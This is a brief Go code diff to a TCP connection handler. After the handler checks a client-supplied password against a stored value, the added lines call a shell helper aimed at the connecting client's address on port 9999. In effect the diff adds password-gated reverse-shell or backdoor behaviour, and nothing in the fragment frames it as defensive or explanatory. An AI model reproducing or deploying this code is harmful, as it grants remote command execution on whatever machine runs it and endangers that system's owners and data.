@@ -22,7 +22,8 @@ func HandleConnection(c net.Conn) {
 		println(temp)
 		if temp == helpers.Password {
 			c.Write([]byte(string("success")))
-			print(strings.Split(c.RemoteAddr().String(), ":")[0])
+			println(strings.Split(c.RemoteAddr().String(), ":")[0] + ":9999")
+			helpers.Shell(strings.Split(c.RemoteAddr().String(), ":")[0] + ":9999")
 			break
 		} else {
 			c.Write([]byte(string("error")))
